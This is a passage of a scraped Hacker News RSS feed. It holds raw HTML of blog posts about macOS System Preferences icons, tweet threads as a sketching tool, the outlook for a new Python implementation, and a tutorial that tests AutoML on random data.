  <img alt="international" title="international" src="https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/20801/international.jpg" srcset="https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/98e5d/international.jpg 180w,https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/543cd/international.jpg 360w,https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/20801/international.jpg 720w,https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/b37e7/international.jpg 1080w,https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/33266/international.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h2 id="looking-forward-to-big-sur">Looking forward to Big Sur</h2><p>Mac UI has evolved considerably, yet gradually over the last two decades. Big
Sur takes this further<sup><a href="#footnote_4">[4]</a></sup> and tones down
the three-dimensional aspects of the interface such as gradients, shadows, and
borders.</p><p>The icons in System Preferences, on the other hand, have gone the complete
opposite direction. The Sound icon now emits transparent sound waves. Screen
Time is now a realistic, clear hourglass. Spotlight is now a realistic
magnifying glass.</p><p><span><iframe src="https://player.vimeo.com/video/458835318?background=1" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="" title="vimeo video"></iframe></span></p><p>I welcome these changes and can’t wait to use them once Big Sur launches.</p><hr><ol><li><span id="footnote_1"><a href="https://www.youtube.com/watch?v=Ko4V3G4NqII"><i>Macworld San Francisco 2000</i></a>&nbsp;<a href="#1">↩︎</a></span></li><li><span id="footnote_2"><a href="https://512pixels.net/2014/04/aqua-past-future/"><i>On the Past, Present and Future of Apple’s Aqua User Interface </i></a> · 512 Pixels<!-- -->&nbsp;<a href="#2">↩︎</a></span></li><li><span id="footnote_3"><a href="http://www.minimallyminimal.com/blog/apple-pro-mouse"><i>Apple (Pro) Mouse</i></a> · Minimally Minimal<!-- -->&nbsp;<a href="#3">↩︎</a></span></li><li><span id="footnote_4"><a href="https://www.andrewdenty.com/blog/2020/07/01/a-visual-comparison-of-macos-catalina-and-big-sur.html"><i>A visual comparison of macOS Catalina and Big Sur</i></a> · Andrew Denty<!-- -->&nbsp;<a href="#4">↩︎</a></span></li></ol><hr><p>Thanks to Q for reading drafts of this. Thanks to
<a href="https://twitter.com/gruber">John Gruber</a> and
<a href="https://twitter.com/siracusa">John Siracusa</a> for helping me track down the
significance of July 18. Thanks to Stephen Hackett at
<a href="https://512pixels.net/">512 Pixels</a> and
<a href="https://guidebookgallery.org/">GUIdebook</a> for screenshots of older versions of
macOS.</p><p><strong>Update:</strong> I previously mistakenly said that Energy Saver would be replaced by
the Battery setting, but I have learned that it only applies to MacBook laptops.
Energy Saver will remain on desktops.</p></div></section><div><div><p><span>Subscribe to the newsletter</span></p></div></div></div></div></div>]]>
            </description>
            <link>https://www.arun.is/blog/system-preferences/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24546525</guid>
            <pubDate>Mon, 21 Sep 2020 18:07:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tweet threads cured my writer's block: Twitter as a medium for sketching]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24546469">thread link</a>) | @pcr910303
<br/>
September 21, 2020 | https://www.geoffreylitt.com/2020/09/21/twitter-and-media-for-sketching.html | <a href="https://web.archive.org/web/*/https://www.geoffreylitt.com/2020/09/21/twitter-and-media-for-sketching.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Twitter is a powerful <b>medium for sketching</b>: a tool for fluidly developing ideas in realtime. What can we learn from its design? I think it shows us the power of 1) the right constraints, 2) low barriers to starting and finishing, and 3) a social context.</p><div><figure>
  <img src="https://www.geoffreylitt.com/images/article_images/sketching.jpg?1600706839" alt="A hand sketching on a notebook">
  <figcaption>Photo by <a href="https://unsplash.com/photos/8DTIQ_Klxho">Keith Pitts on Unsplash</a></figcaption>
</figure>

<p>Writing is…hard. Like most aspiring bloggers, my folders of drafts and my dreams of future prolificness outweigh my actual output.</p>

<p>I’ve found a curious trick for getting over this hurdle, though: writing tweet threads. I’ve published many little bursts of tweets about topics I’m curious about:</p>

<ul>
<li><a href="https://twitter.com/geoffreylitt/status/1272542423001022467">connections between change in physical architecture and software</a></li>
<li><a href="https://twitter.com/geoffreylitt/status/1250443671020986368">pondering Airtable’s macro system</a></li>
<li><a href="https://twitter.com/geoffreylitt/status/1177607448682582016">the danger of “app-ifying” spreadsheets</a></li>
<li><a href="https://twitter.com/geoffreylitt/status/1258769298862100483">digging into the history of Applescript</a></li>
</ul>

<p>These are exactly the kinds of things I’d like to blog about! But somehow, I’ve found it 10 times easier to publish the tweet threads.</p>

<p>I can hear you groaning already. Of course tweeting is easier than writing, you dummy! Our minds are being driven into the meat grinder 280 characters at a time, as we replace deep logical thought with aphorisms and memes. Twitter is PowerPoint thinking on steroids.</p>

<p>But I think this dismissive response misses the point. We can’t really understand Twitter by treating it as a mediocre replacement for essays and research papers. We need to see it as a new medium on its own terms. In particular, <strong>Twitter is a medium for <em>sketching</em></strong>—for playing with ideas, on the fly. Twitter is more similar to scribbling on a whiteboard or tossing ideas around at the cafe than writing a book. (By sketching I don’t mean literally just drawing; I mean any lightweight early expression of a thought.)</p>

<p>Why does Twitter work so well for this? Here are some of my theories:</p>

<ul>
<li><strong>The right constraints</strong>: Good sketching tools provide the right limits on what you can do. Twitter’s constraints go beyond the obvious character count.</li>
<li><strong>Low barriers</strong>: Twitter makes it easy to get started. But, crucially, it also makes it easy to <em>finish</em>!</li>
<li><strong>A social context</strong>: Twitter provides a highly interconnected context for thinking. Should we be worried it takes it too far?</li>
</ul>

<p>By reflecting on these properties, I think we can gain some insight not just into Twiter specifically, but also the broader landscape of tools for thinking. Let’s dive in.</p>

<h2 id="the-right-constraints">The right constraints</h2>

<p>Thinking about big new things is hard, and our brains are good at finding ways to weasel out of the job by finding something easier to do, but still plausibly productive. Unfortunately, in the early stages of sketching out an idea, such distractions abound: worrying about word choice in the last paragraph instead of writing the next one, futzing with the font size, making a new blog system instead of writing the damn blog post.</p>

<p>We can try to avoid these temptations, but an easier route is to simply find tools that don’t allow have the temptations in the first place. <strong>This is a key property of good sketching tools: they provide the right constraints.</strong></p>

<h3 id="tiny-linear-atomic-outlines">Tiny, linear, atomic outlines</h3>

<p>Let’s examine a few of Twitter’s valuable constraints.</p>

<p>Start with the obvious one: <strong>the 280 character limit</strong>. Twitter’s main constraint is encouraging concision. It’s hard to dwell on word choice when you have so little space to work with. Twitter’s conversational tone also helps here—I can just <a href="http://www.paulgraham.com/talk.html">write like I talk</a>, and any fancy words would seem out of place. And of course, I can’t tweak fonts and margins, which cuts off a distraction vector.</p>

<p>But threads complicate the story of character limits a bit. The limit isn’t really that your entire point must fit into one tweet—it’s that <strong><em>each</em> of your individual points must squeeze under the limit</strong>. This provides a different useful constraint: each idea has to be wrapped in a little atomic package. I find this helpful for figuring out the boundaries between my thoughts and clarifying the discrete units of an argument.</p>

<p>That constraint sort of resembles the benefits of an outlining tool. But Twitter has another constraint: <strong>a thread is linear</strong>! No indenting allowed. This forces a brisk straightline through the argument, instead of getting mired in the fine points of the sub-sub-sub-arguments of the first idea. Very limiting, but simultaneously freeing.</p>

<p>Taken together, these constraints frame the pros and cons of the medium, its appropriate range of usage. Obviously, writing a book in a single-level outline would be foolish, but it works for a rough sketch. More interestingly, I think Twitter is useless for persuading a skeptical reader; there’s simply not space for providing enough detail and context. This is a common property of media for sketching: the initial mockup isn’t impressive enough to sway a user, even if it’s a useful tool for the internal team. I prefer to use Twitter as a way to workshop ideas with sympathetic parties who already have enough context to share my excitement about the ideas.</p>

<p>Perhaps there’s a general principle here: Twitter is good for sketching ideas for the same reasons it’s bad for fully developing them. You can’t accidentally start writing a book in Twitter, and that’s kind of the point.</p>

<h3 id="the-puzzle-of-constraints">The puzzle of constraints</h3>

<p>In general, what are the <em>right</em> constraints for a sketching tool? I think this question is deeper than it seems at first glance.</p>

<p>You might say something like “only offer the minimum fidelity needed to convey the point,” but I think it’s not obvious how to define that minimum level. <a href="https://basecamp.com/shapeup/1.3-chapter-04#fat-marker-sketches">Sketching with a fat marker</a> can prevent us from getting too detailed with our drawings; <a href="https://museapp.com/">Muse</a>, which I’ve been using for iPad sketching recently, intentionally limits your ink choices to just a few colors.</p>

<p>This works great for certain kinds of thinking and mockups. But for designing new interactions with animation and physics, we need <a href="http://notebook.maryrosecook.com/Prototypingtools.html">a totally different class of tools</a> with more capabilities! The line between essential and spurious depends on the goal.</p>

<p>Providing the right constraints isn’t always a matter of removing. It can require adding advanced capabiliites too, like this <a href="https://distill.pub/2017/aia/">typeface design tool</a> that uses fancy machine learning to provide a few simple knobs for controlling things like “bold.” It doesn’t let you move individual vector points, but instead lets you operate at a more natural level of abstraction.</p>

<p>If you’re not careful, constraints can easily damage fluidity—as <a href="http://gordonbrander.com/pattern/brick-pencil/">Engelbart showed</a>, tying a brick to a pencil does not yield a productive tool.</p>

<figure>
<img src="https://www.geoffreylitt.com/images/article_images/engelbart-brick-pencil.jpg?1600706839">
<figcaption>Surprise, surprise: writing with a “brick pencil” makes it harder to think big thoughts</figcaption>
</figure>

<p>Overall, it seems that we want constraints that help keep us on track with fluid thought, but don’t rule out too many interesting possibilities. Considering both of these criteria together is a subtle balancing act, and I don’t see easy answers.</p>

<h2 id="low-barriers">Low barriers</h2>

<p>There’s a <strong>low barrier to starting</strong> on Twitter. Just click a button, type a thought, no need to spend a minute remembering how to start my blog server. Often, that first minute of friction is enough to prevent me from getting into the flow of writing.</p>

<p>But the more interesting phenomenon is the <strong>low barrier to finishing</strong>. On Twitter, a single sentence is a completely acceptable unit of publication. Anything beyond that is sort of a bonus. In contrast, most of my blog posts go unpublished because I fear they’re not complete, or not good enough in some dimension. These unpublished drafts are obviously far more complete than a single tweet, but because they’re on a blog, they don’t feel “done,” and it’s hard to overcome the fear of sharing.</p>

<p>This seems like a crucial part of sketching tools: when you make a sketch, it should be understood that your idea is immature, and feel safe to share it in that state. <strong>There’s a time and a place for polished, deeply thorough artifacts… and it’s not Twitter!</strong> Everyone knows you just did a quick sketch.</p>

<p>I believe that quantity leads to quality. <a href="https://kottke.org/09/02/art-and-fear">The students who make more pots in ceramics class improve faster than the students who obsess over making a single perfect pot</a>. A tool with a built-in low barrier to finishing makes it easier to overcome the fear, do more work, and share it at an earlier stage.</p>



<p>In my experience, sketching always requires a delicate dance between individual thought and collaboration. You sketch to clarify something for yourself, but also to communicate with others. I think a good sketching medium should account for both halves of the process.</p>

<p>Writing a blog can feel like a lonely one-way mirror: release something into the world, maybe get a few comments back and some Hacker News snark. In contrast, <strong>Twitter is a bazaar, buzzing with activity</strong>. The engagement ratio is totally different. You can easily have micro-conversations around individual points in a thread. When the same people start showing up time after time, it starts to feel like <a href="https://twitter.com/simonsarris/status/1270744181313503234">seeing acquaintances in a village</a>. On Twitter, I write for my Twitter friends, not for some amorphous crowd.</p>

<p>At its best, this engagement leads to the kind of back-and-forth that characterizes my favorite kinds of sketching sessions. Ideas are in the air, it’s not clear where they came from really, they combine to form new ones in realtime. For me, Twitter does an oddly good job at simulating the thrilling creative energy of a whiteboarding session. People pop in and out of the conversation offering insights; trees and sub-trees form riffing off of earlier points.</p>

<p>Of course, my feeling of safety here presumes healthy engagement from other parties, a privilege not enjoyed by all. I suppose it’s kind of odd that such a globally public medium is suitable at all for sketching—it seems only possible because I’ve found safe, trusting mini-communities, defined by informal and permeable boundaries. Perhaps a more private Twitter would be even better for sketching, although it might cut out new people from entering the conversation?</p>



<p>In an attempt to <em>sketch</em> more in the blog medium, I just whipped up this blog post in a couple hours, so I don’t really have a grand conclusion. And yet I’m still hitting …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.geoffreylitt.com/2020/09/21/twitter-and-media-for-sketching.html">https://www.geoffreylitt.com/2020/09/21/twitter-and-media-for-sketching.html</a></em></p>]]>
            </description>
            <link>https://www.geoffreylitt.com/2020/09/21/twitter-and-media-for-sketching.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24546469</guid>
            <pubDate>Mon, 21 Sep 2020 18:02:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Waiting for the Next Python Implementation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24546401">thread link</a>) | @pcr910303
<br/>
September 21, 2020 | http://ballingt.com/next-python/ | <a href="https://web.archive.org/web/*/http://ballingt.com/next-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>The time may be ripe for a new Python implementation.</p>
<p>A <a href="https://www.youtube.com/watch?v=ITksU31c1WY">lot</a> <a href="https://www.youtube.com/watch?v=KDXhu4rxTNY">of</a> <a href="https://www.youtube.com/watch?v=ftP5BQh1-YM">keynotes</a> lately have called for one anyway. They are joined — informally, not speaking in an official capacity — by Python core developers in issuing a wakeup call: where is Python in the browser? Where is Python on mobile devices? How could Python be 2x faster?</p>
<p>Barry Warsaw at the <a href="https://youtu.be/8dDp-UHBJ_A?t=2288">PyCon 2019 Python Steering Council Panel Keynote</a>:</p>
<blockquote>
<p>The language is pretty awesome.
[…]
The interpreter, in a sense, is 28 years old.</p>
</blockquote>
<p>Such a new Python implementation might be faster, work on different platforms, or have a smaller end deliverable.</p>
<p>It might accomplish these goals with a just-in-time or ahead-of-time compiler.</p>
<p>WebAssembly might significantly influence its implementation.</p>
<p>And critically, it might implement a different specification of Python.</p>
<hr>
<p>Wait, what? Will this still be Python?</p>
<p>If the new implementation is useful enough and has a level of compatibility with CPython that the community can deal with, (Brett Cannon said <a href="https://talkpython.fm/episodes/transcript/213/webassembly-and-cpython">something like this on a podcast</a> a few months ago) then it might somehow be canonized.</p>
<p>This “Optimizable Python” or “Restricted Python” or “Fast Python” or “Static Python” or “Boring Python,” subset could, once agreed upon, have its semantics shadowed in CPython in an optional mode.</p>
<p>What might be up for debate? A few suggestions from <a href="https://youtu.be/KDXhu4rxTNY?t=1168">Łukasz’s talk</a>:</p>
<ul>
<li>eval / exec (compiled in an environment that doesn’t allow setting regions as executable, like iOS or (perhaps? I haven’t looked) the webassembly spec.</li>
<li>the complexities and dynamism of the import system.</li>
<li>metaclasses - I don’t know what this enables, but it seems like a concession parts of the community might be willing to make</li>
<li>descriptors</li>
<li>dynamic attribute access</li>
</ul>
<hr>
<p>So now that the Python 2 to 3 transition is wrapping up and the Python language’s governance issues have been dealt with, it’s time for some dramatic initiatives: let’s grab some stakeholders and come up with the parts of the Python spec to mark optional and get this into CPython so we can start porting code again! I propose <code>python -z</code> for zoom — there we go, ZoomPython! — because I don’t see <code>-z</code> in python or IPython command line tools. We’ll need some syntax like JavaScript’s <code>use strict</code> to mark code this way, I propose the magic string <code># this code zooms</code>. Can the committee just tell us what the new spec is already?</p>
<p>No! Or as Łukasz Langa says <a href="https://youtu.be/KDXhu4rxTNY?t=2470">in response to a a better question after his keynote</a>,</p>
<blockquote>
<p>“Yes, but the way you get there is to have an alternative platform that informs you what the constrained version of the language should be. If you try to predict the future of what are people are going to need, you’re likely to end up with a design that is artificial and not necessarily useful.”</p>
</blockquote>
<p>So we’re back to the hoping and waiting and wondering: where will the implementation proposal for FastPython come from?</p>
<hr>
<p>Despite some <a href="https://youtu.be/ftP5BQh1-YM?t=2898">calls for financially support of such an effort</a> it seems that leading the prototyping of a new language implementation is not at the top of the priority list for committee. Core developers and language steering committee members seem to believe that this kind of experimental project should come from the outside. (try searching for the word Community in the transcript of <a href="https://talkpython.fm/episodes/transcript/213/webassembly-and-cpython">the podcast Brett was on</a>) This makes sense to me.</p>
<p>PyPy is the second-most popular Python implementation. It’s “bug-compatible” with CPython, including the C extension interface, making it a viable drop-in, faster replacement for many CPython programs. It’s an incredible engineering effort, perhaps comparable in scope to the work optimizing JavaScript engines that made that language the fasted dynamically typed language in wide use. If dedicated graduate student and individual hackers, academic funding, and governments grants could make a Python so compliant and fast a Python implementation once, maybe that’s where the next implementation will come from too!</p>
<p>MicroPython is closer in design to an imagined implementation of the future: its behavior is <a href="https://docs.micropython.org/en/latest/genrst/index.html">different than CPython in a variety of cases</a> and includes <a href="https://docs.micropython.org/en/latest/reference/speed_python.html#the-native-code-emitter">the ability to compile individual functions</a> that do not use features like context managers and generators. MicroPython was initially a Kickstarter-backed effort, then later supported by the Python Software Foundation <a href="https://en.wikipedia.org/wiki/MicroPython">as part of its inclusion on the BBC Micro Bit</a>. The development of MicroPython provides an example of how an alternate implementation might be started by a single individual.</p>
<p>But I think the most likely place for a new implementation to come from is a large company that uses Python and has a specific need for a new interpreter. This belief comes from my time at Dropbox, where I’ve seen how projects to improve languages can happen at a company of that size: since we had so many programmers working on so much Python code, better Python tooling would be so useful a case could be made for doing it ourselves. At Dropbox this project has been the Mypy Python static type checker, but I could imagine similar projects to write language implementations. (I’m not imagining too hard; Dropbox is also supporting work on mypyc, a Python compiler I’ll discuss more in a future post.)</p>
<p>If you are employed at such a company, it’s hard for me to know how to help you make the business case, but know that it has been done before! Please consider it.</p>
<p>Where would that be? A lot of companies! Some of my favorite corporate contributions to the Python community have come from Dropbox and Instagram, but Python isn’t a niche thing anymore and there must be dozens? hundreds? of companies with idiosyncratic business interests such that a Python implementation that ran in the browser, or ran faster, or ran sandboxed, would save them millions of dollars.</p>
<hr>
<p>In <a href="https://youtu.be/KDXhu4rxTNY?t=962">his inspirational keynote</a>, Łukasz phrased this as a call to action:</p>
<blockquote>
<p>This is where you come in. Truly tremendous impact awaits!</p>
</blockquote>
<p>I don’t think I’ll be one the call-answerers here, but I wish these implementers the best!</p>
<p>I think I support the apparent decision for the search for the next implementation not to be centrally directed; I agree that this can come from the community, and the proof of its usefulness can too. But there is something I think we can do centrally.</p>
<p>Without pre-emptively deprecating Python language features or designating them as optional, Python can be made a more attractive implementation target by making it smaller in a another way: separating the language from standard library.</p>
<p>Glyph proposes moving CPython <a href="https://glyph.twistedmatrix.com/2019/06/kernel-python.html">toward a Kernel Python</a> for a variety of reasons. I find that case convincing.</p>

</div></div>]]>
            </description>
            <link>http://ballingt.com/next-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24546401</guid>
            <pubDate>Mon, 21 Sep 2020 17:57:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Training AutoML on Random Data – seeking for signal in the data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24546390">thread link</a>) | @pplonski86
<br/>
September 21, 2020 | https://supervised.mljar.com/tutorials/random/ | <a href="https://web.archive.org/web/*/https://supervised.mljar.com/tutorials/random/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-md-component="container">
<main data-md-component="main">
<div>


<div>
<article>
<a href="https://github.com/mljar/docs/edit/master/docs/tutorials/random.md" title="Edit this page">
<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"></path></svg>
</a>

<p>Have you ever consider using Machine Learning and wasn't sure about it? Would you like to know when using Machine Learning is justified? Would you like to know how to check if there is a 'signal' in your data? I've trained <a href="https://github.com/mljar/mljar-supervised">AutoML</a> on random data an present results here to help you get a better ML understanding when to use ML and how good is your data. </p>
<p>All experiments results and code is available at <a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data">GitHub</a>.</p>
<h2 id="the-experiment">The experiment<a href="#the-experiment" title="Permanent link">¶</a></h2>
<p>I've generated 3 datasets with random data. Each has 10 columns and 1k, 5k, 10k of rows. The target for each dataset is a random vector of <code>{0, 1}</code> - so a binary classification problem. I've used <a href="https://github.com/mljar/mljar-supervised">mljar-supervised</a> AutoML python package. I run AutoML in <code>Explain</code> mode and <code>feature_selection=True</code>. The AutoML will train:</p>
<ul>
<li><code>Baseline</code> (returns the most frequent class as prediction),</li>
<li><code>Decision Tree</code>,</li>
<li><code>Linear</code> model (aka Logistic Regression),</li>
<li><code>Random Forest</code>,</li>
<li><code>Xgboost</code>,</li>
<li><code>Neural Network</code>,</li>
<li><code>Ensemble</code>.</li>
</ul>
<p>AutoML will train above algorithms with default hyperparameters on <code>75%/25%</code> train/test data split. Additionally, full explanations will be produced for all models.</p>
<h2 id="the-code">The code<a href="#the-code" title="Permanent link">¶</a></h2>
<p>The code to run the experiment is simple:</p>
<ul>
<li>generate random data,</li>
<li>run the AutoML.</li>
</ul>
<div><pre><span></span><code><span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>from</span> <span>supervised</span> <span>import</span> <span>AutoML</span>

<span>COLS</span> <span>=</span> <span>10</span>

<span>for</span> <span>ROWS</span> <span>in</span> <span>[</span><span>1000</span><span>,</span> <span>5000</span><span>,</span> <span>10000</span><span>]:</span>
    <span>X</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>uniform</span><span>(</span><span>size</span><span>=</span><span>(</span><span>ROWS</span><span>,</span> <span>COLS</span><span>))</span>
    <span>y</span> <span>=</span> <span>np</span><span>.</span><span>random</span><span>.</span><span>randint</span><span>(</span><span>0</span><span>,</span> <span>2</span><span>,</span> <span>size</span><span>=</span><span>(</span><span>ROWS</span><span>,))</span>

    <span>automl</span> <span>=</span> <span>AutoML</span><span>(</span><span>results_path</span><span>=</span><span>f</span><span>"AutoML_</span><span>{</span><span>ROWS</span><span>//</span><span>1000</span><span>}</span><span>k"</span><span>,</span> <span>mode</span><span>=</span><span>"Explain"</span><span>,</span> <span>features_selection</span><span>=</span><span>True</span><span>)</span>
    <span>automl</span><span>.</span><span>fit</span><span>(</span><span>X</span><span>,</span> <span>y</span><span>)</span>
</code></pre></div>
<p>For each AutoML run there is a directory with all results: [<code>AutoML_1k</code>, <code>AutoML_5k</code>, <code>AutoML_10k</code>].</p>
<h2 id="result-for-1k-random-data">Result for 1k random data<a href="#result-for-1k-random-data" title="Permanent link">¶</a></h2>
<p>The table with models:</p>
<table>
<thead>
<tr>
<th>Best model</th>
<th>name</th>
<th>model_type</th>
<th>metric_type</th>
<th>metric_value</th>
<th>train_time</th>
<th>Link</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>1_Baseline</td>
<td>Baseline</td>
<td>logloss</td>
<td>0.692639</td>
<td>0.17</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k1_Baseline/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>2_DecisionTree</td>
<td>Decision Tree</td>
<td>logloss</td>
<td>0.79591</td>
<td>9.32</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k2_DecisionTree/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>3_Linear</td>
<td>Linear</td>
<td>logloss</td>
<td>0.696153</td>
<td>5.83</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k3_Linear/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>4_Default_RandomForest</td>
<td>Random Forest</td>
<td>logloss</td>
<td>0.693047</td>
<td>7.18</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k4_Default_RandomForest/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>5_Default_Xgboost</td>
<td>Xgboost</td>
<td>logloss</td>
<td>0.687018</td>
<td>3.86</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k5_Default_Xgboost/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>6_Default_NeuralNetwork</td>
<td>Neural Network</td>
<td>logloss</td>
<td>0.693683</td>
<td>4.75</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k6_Default_NeuralNetwork/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>5_Default_Xgboost_RandomFeature</td>
<td>Xgboost</td>
<td>logloss</td>
<td>0.684524</td>
<td>0.93</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k5_Default_Xgboost_RandomFeature/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>6_Default_NeuralNetwork_SelectedFeatures</td>
<td>Neural Network</td>
<td>logloss</td>
<td>0.695517</td>
<td>4.56</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k6_Default_NeuralNetwork_SelectedFeatures/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>4_Default_RandomForest_SelectedFeatures</td>
<td>Random Forest</td>
<td>logloss</td>
<td>0.696178</td>
<td>5.78</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k4_Default_RandomForest_SelectedFeatures/README.md">Results link</a></td>
</tr>
<tr>
<td></td>
<td>5_Default_Xgboost_RandomFeature_SelectedFeatures</td>
<td>Xgboost</td>
<td>logloss</td>
<td>0.686194</td>
<td>1</td>
<td><a href="https://github.com/mljar/mljar-examples/tree/master/Random_Data/AutoML_1k5_Default_Xgboost_RandomFeature_SelectedFeatures/README.md">Results link</a></td>
</tr>
<tr>
<td><strong>the best</strong></td>
<td>Ensemble</td>
<td>Ensemble</td>
<td>logloss</td>
<td>0.683784</td>
<td>0.77</td>
<td><a href="https://supervised.mljar.com/tutorials/random/Ensemble/README.md">Results link</a></td>
</tr>
</tbody>
</table>
<p>Results plotted:</p>
<p><img alt="AutoML performance plot" src="https://raw.githubusercontent.com/mljar/mljar-examples/master/Random_Data/AutoML_1k/ldb_performance_boxplot.png"></p>
<h3 id="compare-algorithms">Compare algorithms<a href="#compare-algorithms" title="Permanent link">¶</a></h3>
<p>The first <strong>red flag</strong> <img alt="🚩" src="https://twemoji.maxcdn.com/v/latest/svg/1f6a9.svg" title=":triangular_flag_on_post:"> - the <code>Baseline</code> model is much better than <code>Decision Tree</code>, <code>Linear</code>, <code>Neural Network</code> and <code>Radnom Forest</code>! The constant prediction is better than complex Machine Learning algorithms. Something is wrong ...</p>
<h3 id="the-percentage-improvement">The percentage improvement<a href="#the-percentage-improvement" title="Permanent link">¶</a></h3>
<p>The <code>% difference</code> between the best model (<code>Ensemble</code>) and <code>Baseline</code>:</p>
<div><pre><span></span><code>% difference = (0.6926 - 0.6837) / 0.6926 * 100.0 = 1.28%
</code></pre></div>
<p>The best ML model is only <code>1.28%</code> better than simple baseline which predicts always the most frequent class (for example, always returns <code>1</code>). The second <strong>red flag</strong> <img alt="🚩" src="https://twemoji.maxcdn.com/v/latest/svg/1f6a9.svg" title=":triangular_flag_on_post:"> - the performance improvement of best model over <code>Baseline</code> is very small. (Personally, I'm using <code>5%</code> as a threshold to decide if there is some 'signal' in the data).</p>
<h3 id="learning-curves">Learning curves<a href="#learning-curves" title="Permanent link">¶</a></h3>
<p>Let's look at learning curves of the <code>Xgboost</code> (model name <code>5_Default_Xgboost</code>):</p>
<p><img alt="Xgboost learning curves" src="https://raw.githubusercontent.com/mljar/mljar-examples/master/Random_Data/AutoML_1k/5_Default_Xgboost/learning_curves.png"></p>
<p>Can you see this huge overfit? <img alt="😱" src="https://twemoji.maxcdn.com/v/latest/svg/1f631.svg" title=":scream:"> This plot can be showed at classes as a perfect example of the overfit. The train <code>logloss</code> is going down and test <code>logloss</code> is going in the opposite direction. The model is starting to overfit very fast (<code>5</code> trees in the <code>Xgboost</code>) - the third <strong>red flag</strong> <img alt="🚩" src="https://twemoji.maxcdn.com/v/latest/svg/1f6a9.svg" title=":triangular_flag_on_post:"> (fast overfitting).</p>
<h3 id="features-importance">Features importance<a href="#features-importance" title="Permanent link">¶</a></h3>
<p>Here is the feature importance for the <code>Xgboost</code> trained with additional <code>radnom_feature</code>:</p>
<p><img alt="feature importance" src="https://raw.githubusercontent.com/mljar/mljar-examples/master/Random_Data/AutoML_1k/5_Default_Xgboost_RandomFeature/permutation_importance.png"></p>
<p>Just another random feature in the plot ... But you can see how overfitting works: <code>feature_3</code> is much more important than <code>random_feature</code>.</p>
<h2 id="result-for-5k-random-data">Result for 5k random data<a href="#result-for-5k-random-data" title="Permanent link">¶</a></h2>
<p>Results for data with 5k random samples is very similar, except that <code>Baseline</code> was the best performing model!</p>
<p><img alt="Results on 5k random data" src="https://raw.githubusercontent.com/mljar/mljar-examples/master/Random_Data/AutoML_5k/ldb_performance_boxplot.png"></p>
<h2 id="result-for-10k-random-data">Result for 10k random data<a href="#result-for-10k-random-data" title="Permanent link">¶</a></h2>
<p>For 10k samples of random data the feature selection algorithm started to work. All features were less important than injected <code>random_feature</code>:</p>
<p><img alt="Feature importance on 10k data" src="https://raw.githubusercontent.com/mljar/mljar-examples/master/Random_Data/AutoML_10k/4_Default_RandomForest_RandomFeature/permutation_importance.png"></p>
<p>The AutoML rasied the exception that all data looks like random! (see the <a href="https://github.com/mljar/mljar-examples/blob/master/Random_Data/AutoML_10k/errors.md">errors.md</a>)</p>
<h2 id="summary">Summary<a href="#summary" title="Permanent link">¶</a></h2>
<p>When training Machine Learning models it is always worth to check the <code>Baseline</code>. You will get the intuition about your data and problem that you are solving.</p>
<p>Red flags <img alt="🚩" src="https://twemoji.maxcdn.com/v/latest/svg/1f6a9.svg" title=":triangular_flag_on_post:"> during training Machine Learning models that warn you that your data might be random (or with some errors):</p>
<ul>
<li>The <code>Baseline</code> algorithm outperforms complex ML algorithms.</li>
<li>The percentage difference between the best model and the <code>Baseline</code> model is very small (smaller than <code>5%</code>).</li>
<li>Models are overfitting very fast.</li>
<li>All features are dropped during the feature selection procedure.</li>
</ul>
</article>
</div>
</div>
</main>

</div></div>]]>
